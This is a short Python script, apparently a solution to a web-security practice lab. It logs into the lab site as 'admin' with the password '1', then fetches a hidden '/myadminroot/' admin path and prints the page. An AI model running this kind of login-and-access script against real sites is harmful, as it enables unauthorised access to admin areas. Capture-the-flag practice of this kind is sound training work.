import requests
r = requests.Session()
url = 'http://lab1.xseclab.com/pentest3_307c0281537de1615673af8c1d54885a/'
data = {'username': 'admin', 'password': '1'}
r.post(url, data=data)

url2 = 'http://lab1.xseclab.com/pentest3_307c0281537de1615673af8c1d54885a/myadminroot/'
print r.get(url2).content
